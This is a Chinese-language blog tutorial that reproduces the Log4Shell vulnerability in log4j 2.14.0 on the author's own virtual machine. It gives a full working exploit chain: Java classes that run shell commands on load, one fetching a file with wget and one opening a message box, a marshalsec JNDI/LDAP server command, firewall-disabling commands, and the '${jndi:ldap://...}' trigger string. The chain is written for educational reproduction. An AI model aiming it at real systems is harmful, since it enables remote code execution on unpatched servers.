# log4j-2.14.0漏洞攻击复现

​     刚知道log4j漏洞的时候，我就在自己负责的项目里简单测试了一下，没有测试出来也就没有再关注这个了。接下来几天的时间无论是朋友圈、聊天群、技术论坛都是在讨论这个话题的，成功引起了我的好奇，我就想复现一下这个漏洞。刚开始复现的时候为图省事我就创建了一个springboot项目，在springboot项目里无论我怎么测试都复现不了这个，然后我有怀疑是因为jdk的版本原因我使用的是jdk11，我更换了很多版本的jdk还是复现不了，直到我看到了一位大佬发布的帖子[Spring Boot应对Log4j2注入漏洞官方指南](https://blog.csdn.net/qq_35067322/article/details/121882240)中有这么一段话:

> **Spring Boot默认日志组件是logback，开发者通过日志门面Slf4j进行集成对接。Spring Boot 用户只有在将默认日志系统切换到 Log4J2 时才会受到此漏洞的影响。Spring Boot包含的log4j-to-slf4j和log4j-api、spring-boot-starter-logging不能独立利用。只有log4j-core在日志消息中使用和包含用户输入的应用程序容易受到攻击。**

简单一句话在springboot默认配置中是不会触发这个漏洞的，而我为了图省事用的就是默认配置。接下来我创建了一个maven项目成功复现了这个漏洞。我把自己复现的过程记录下来，分享给大家。

##  **环境准备**:

|                         软件                         |          版本           |                       描述                       |                           下载地址                           |
| :--------------------------------------------------: | :---------------------: | :----------------------------------------------: | :----------------------------------------------------------: |
|                        CentOS                        | 8.3.2011-x86_64-minimal |                  liunx操作系统                   | 链接: https://pan.baidu.com/s/1pG549BKWhbveM_Pvgj595g 提取码: iur3 |
|                         Idk                          |        1.8.0_312        |                       Java                       | 链接: https://pan.baidu.com/s/1jWUd1EjQnC5yybLiJlD9OA 提取码: knc7 |
| [marshalsec](https://github.com/mbechler/marshalsec) |          0.0.3          | java工具将数据转化为代码执行（这里是我编译好的） | 链接: https://pan.baidu.com/s/1M-qLRpb8C3DWtVG9BNojdg 提取码: mc7c |

## **攻击流程：**

1. 编写java攻击代码。
2. 将编写的攻击代码编译成class文件，然后发布到文件服务器。这里我是用nginx做演示。
3. [marshalsec](https://github.com/mbechler/marshalsec)使用将编写的class用jndi发布出去。
4. 本地测试触发。



## 开始实现：

**第一步：编写攻击代码** 

```import java.lang.Runtime;
import java.lang.Runtime;
import java.lang.Process;

/**
 * @author fuping
 */
public class Attack {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
			System.out.println("wget 下载图片");
            String[] commands = {"/bin/bash", "-c", "wget https://raw.githubusercontent.com/duzhaosongyue/img/main/1.png"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

> liunx版本的攻击代码。

``` java
import java.io.IOException;

/**
 * @author fuping
 */
public class Attack {
    static {
        try {
            Runtime.getRuntime().exec("cmd /c mshta vbscript:msgbox(\"有人从你的log4j进来了\",64,\"来自熊猫头的消息\")(window.close)");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

> windows版本的攻击代码。

**第二步：发布攻击代码到文件服务器**

1. 在虚拟机centos系统中安装nginx。可以使用一下命令安装：`yum -y  install nginx`

2. 找到hmtl文件夹。可以使用一下命令搜索：`find / -type d -name html`  

   > 这里我搜索到路径是 /usr/share/nginx/html。  

3. 上传编译好的class文件到搜索的html文件夹下。

4. 启动nginx。命令如下：`sudo nginx`

5. 使用虚拟主机ip+端口+文件名称尝试下载文件。

   > 这里我的下载地址为 http://172.16.102.19/Attack.class 。如果出现不能下载的情况请检查防火墙是否打开 命令如下：

   ```  shell
   systemctl status firewalld                             #防火墙状态
   systemctl stop firewalld.service                       #关闭防火墙
   firewall systemctl disable firewalld.service           #禁止防火墙开机启动 
   ```

6. 测试下载成功第二步完成进行下一步。

第三步：使用[marshalsec](https://github.com/mbechler/marshalsec)发布jndi服务。

1. 安装jdk1.8.0_312。

   > 1. 上传jdk-8u221-linux-x64.tar.gz到虚拟机。
   >
   > 2. 创建/opt/java目录。创建命令：`mkdir /opt/java`
   >
   > 3. 解压jdk到/opt/java目录下 。解压命令：`tar -zxf jdk-8u221-linux-x64.tar.gz -C /opt/java`
   >
   > 4. 配置环境变量。命令:`sudo vim /etc/profile`. （如果没有安装vim 可以使用 `yum -y install vim`进行安装。）在profile文件最底部追加：
   >
   >    > ``` shell
   >    > export JAVA_HOME=/opt/java/jdk1.8.0_221
   >    > export JRE_HOME=/opt/java/jdk1.8.0_221/jre 
   >    > export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib:$CLASSPATH export PATH=$PATH:$JAVA_HOME/bin  
   >    > ```
   >
   >      
   >
   > 5. 重新加载配置。执行命令 :`source /etc/profile`
   >
   > 6. 测试jdk是否安装成功。执行命令: `java -version`

   

2. 上传[marshalsec](https://github.com/mbechler/marshalsec)到虚拟机。执行一下命令启动jndi服务：

   > `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://172.16.102.19/#Attack" 9991`  
   >
   > 172.16.102.19 指向文件服务器地址，Attack是编译后java攻击代码的类名称，触发jndi请求后会自动拼接请求 http://172.16.102.19/Attack.class 。
   >
   > 上面这个命令不能后台运行，断开链接后也就终止了，后台运行使用:
   >
   > `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://172.16.102.19/#Attack" 9991 > log.txt >&1 &`

## 第四步:本地触发

1. 创建一个maven项目。

2. 添加依赖 。

   >  在pom.xml中添加依赖：
   >
   > ```xml
   > <dependencies>
   >     <dependency>
   >         <groupId>org.apache.logging.log4j</groupId>
   >         <artifactId>log4j-api</artifactId>
   >         <version>2.14.0</version>
   >     </dependency>
   >     <dependency>
   >         <groupId>org.apache.logging.log4j</groupId>
   >         <artifactId>log4j-core</artifactId>
   >         <version>2.14.0</version>
   >     </dependency>
   > </dependencies>
   > ```

3. 配置log4j。 

   > 在src/main/resources目录下创建log4j2.xml 内容如下：
   >
   > ***注意window下路径是/,liunx下路径是\ 如果执行出现错误 请检查输出目录的/是否正确。***
   >
   > ```xml
   > <?xml version="1.0" encoding="UTF-8"?>
   > 
   > <!-- status : 指定log4j本身的打印日志的级别.ALL< Trace < DEBUG < INFO < WARN < ERROR
   >     < FATAL < OFF。 monitorInterval : 用于指定log4j自动重新配置的监测间隔时间，单位是s,最小是5s. -->
   > <Configuration status="WARN" monitorInterval="30">
   >     <Properties>
   >         <!-- 配置日志文件输出目录 ${sys:user.home} -->
   >         <Property name="LOG_HOME">logs</Property>
   >         <property name="ERROR_LOG_FILE_NAME">logs\error</property>
   >         <property name="WARN_LOG_FILE_NAME">logs\warn</property>
   > 
   >         <property name="PATTERN">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t-%L] %-5level %logger{36} - %msg%n</property>
   >     </Properties>
   > 
   >     <Appenders>
   >         <!--这个输出控制台的配置 -->
   >         <Console name="Console" target="SYSTEM_OUT">
   >             <!-- 控制台只输出level及以上级别的信息(onMatch),其他的直接拒绝(onMismatch) -->
   >             <ThresholdFilter level="trace" onMatch="ACCEPT"
   >                              onMismatch="DENY" />
   >             <!-- 输出日志的格式 -->
   >             <!--
   >                 %d{yyyy-MM-dd HH:mm:ss, SSS} : 日志生产时间
   >                 %p : 日志输出格式
   >                 %c : logger的名称
   >                 %m : 日志内容，即 logger.info("message")
   >                 %n : 换行符
   >                 %C : Java类名
   >                 %L : 日志输出所在行数
   >                 %M : 日志输出所在方法名
   >                 hostName : 本地机器名
   >                 hostAddress : 本地ip地址 -->
   >             <PatternLayout
   >                     pattern="${PATTERN}" />
   >         </Console>
   > 
   >         <!--文件会打印出所有信息，这个log每次运行程序会自动清空，由append属性决定，这个也挺有用的，适合临时测试用 -->
   >         <!--append为TRUE表示消息增加到指定文件中，false表示消息覆盖指定的文件内容，默认值是true -->
   >         <File name="log" fileName="logs/test.log" append="false">
   >             <PatternLayout
   >                     pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
   >         </File>
   >         <!-- 这个会打印出所有的info及以下级别的信息，每次大小超过size，
   >         则这size大小的日志会自动存入按年份-月份建立的文件夹下面并进行压缩，作为存档 -->
   >         <RollingFile name="RollingFileInfo" fileName="${LOG_HOME}/info.log"
   >                      filePattern="${LOG_HOME}/$${date:yyyy-MM}/info-%d{yyyy-MM-dd}-%i.log">
   >             <!--控制台只输出level及以上级别的信息（onMatch），其他的直接拒绝（onMismatch） -->
   >             <ThresholdFilter level="info" onMatch="ACCEPT"
   >                              onMismatch="DENY" />
   >             <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n" />
   >             <Policies>
   >                 <!-- 基于时间的滚动策略，interval属性用来指定多久滚动一次，默认是1 hour。 modulate=true用来调整时间：比如现在是早上3am，interval是4，那么第一次滚动是在4am，接着是8am，12am...而不是7am. -->
   >                 <!-- 关键点在于 filePattern后的日期格式，以及TimeBasedTriggeringPolicy的interval，
   >                 日期格式精确到哪一位，interval也精确到哪一个单位 -->
   >                 <!-- log4j2的按天分日志文件 : info-%d{yyyy-MM-dd}-%i.log-->
   >                 <TimeBasedTriggeringPolicy interval="1" modulate="true" />
   >                 <!-- SizeBasedTriggeringPolicy:Policies子节点， 基于指定文件大小的滚动策略，size属性用来定义每个日志文件的大小. -->
   >                 <!-- <SizeBasedTriggeringPolicy size="2 kB" />  -->
   >             </Policies>
   >         </RollingFile>
   > 
   >         <RollingFile name="RollingFileWarn" fileName="${WARN_LOG_FILE_NAME}/warn.log"
   >                      filePattern="${WARN_LOG_FILE_NAME}/$${date:yyyy-MM}/warn-%d{yyyy-MM-dd}-%i.log">
   >             <ThresholdFilter level="warn" onMatch="ACCEPT"
   >                              onMismatch="DENY" />
   >             <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n" />
   >             <Policies>
   >                 <TimeBasedTriggeringPolicy />
   >                 <SizeBasedTriggeringPolicy size="2 kB" />
   >             </Policies>
   >             <!-- DefaultRolloverStrategy属性如不设置，则默认为最多同一文件夹下7个文件，这里设置了20 -->
   >             <DefaultRolloverStrategy max="20" />
   >         </RollingFile>
   > 
   >         <RollingFile name="RollingFileError" fileName="${ERROR_LOG_FILE_NAME}/error.log"
   >                      filePattern="${ERROR_LOG_FILE_NAME}/$${date:yyyy-MM}/error-%d{yyyy-MM-dd-HH-mm}-%i.log">
   >             <ThresholdFilter level="error" onMatch="ACCEPT"
   >                              onMismatch="DENY" />
   >             <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n" />
   >             <Policies>
   >                 <!-- log4j2的按分钟 分日志文件 : warn-%d{yyyy-MM-dd-HH-mm}-%i.log-->
   >                 <TimeBasedTriggeringPolicy interval="1" modulate="true" />
   >                 <!-- <SizeBasedTriggeringPolicy size="10 MB" /> -->
   >             </Policies>
   >         </RollingFile>
   > 
   >     </Appenders>
   > 
   >     <!--然后定义logger，只有定义了logger并引入的appender，appender才会生效-->
   >     <Loggers>
   >         <!--过滤掉spring和mybatis的一些无用的DEBUG信息-->
   >         <logger name="org.springframework" level="INFO"></logger>
   >         <logger name="org.mybatis" level="INFO"></logger>
   > 
   >         <!-- 第三方日志系统 -->
   >         <logger name="org.springframework.core" level="info" />
   >         <logger name="org.springframework.beans" level="info" />
   >         <logger name="org.springframework.context" level="info" />
   >         <logger name="org.springframework.web" level="info" />
   >         <logger name="org.jboss.netty" level="warn" />
   >         <logger name="org.apache.http" level="warn" />
   > 
   > 
   >         <!-- 配置日志的根节点 -->
   >         <root level="all">
   >             <appender-ref ref="Console"/>
   >             <appender-ref ref="RollingFileInfo"/>
   >             <appender-ref ref="RollingFileWarn"/>
   >             <appender-ref ref="RollingFileError"/>
   >         </root>
   > 
   >     </Loggers>
   > 
   > </Configuration>
   > ```

4. 编写测试代码。 

   ```java
   package com;
   import org.apache.logging.log4j.LogManager;
   import org.apache.logging.log4j.Logger;
   
   /**
    * @author fuping
    */
   public class Log4jTest {
       
       private static final Logger LOGGER = LogManager.getLogger(Log4jTest.class);
   
       public static void main(String[] args) {
           System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
           LOGGER.info("{}", "${jndi:ldap://172.16.102.19:9991/Attack}");
       }
   }
   ```



maven项目测试项目的源码可以在[github](https://github.com/duzhaosongyue/log4j_test)下载
